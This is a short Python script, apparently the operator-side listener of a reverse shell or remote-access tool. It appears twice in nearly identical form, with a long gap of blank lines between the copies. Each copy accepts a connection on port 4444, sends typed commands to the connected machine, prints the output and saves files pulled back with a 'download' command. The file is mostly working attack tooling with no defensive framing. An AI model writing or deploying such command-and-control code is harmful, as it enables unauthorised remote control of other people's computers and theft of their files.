import socket 
HOST='127.0.0.1'
PORT = 4444
import base64

with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
    s.bind((HOST , PORT))
    print(' [+] listning for incoming connection --- ')
    s.listen()
    connection  , address = s.accept()
    print(' [+] Got  connection --- ')
    with connection:
        while True:
            command = input(' Enter your command > ').encode()
            util = command.decode()
            util = util.split()
            connection.send(command)
            data = connection.recv(1024)
            if util[0] == 'download':
                with open(util[1] , 'wb') as file:
                    file.write( base64.b85decode(data))
            print(data)





























































import socket
import base64
HOST='127.0.0.1'
PORT = 4444

with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
    s.bind((HOST , PORT))
    print(' [+] listning for incoming connection --- ')
    s.listen()
    connection  , address = s.accept()
    print(' [+] Got  connection --- ')
    with connection:
        while True:
            command = input(' Enter your command > ').encode()
            connection.send(command)
            util = command.decode()
            util = util.split()
            data = connection.recv(1024).decode()
            print(util[0])
            if util[0] == 'download':
                with open( util[1] , "wb") as file:
                    file.write( base64.b64decode(data) )
            print(data)



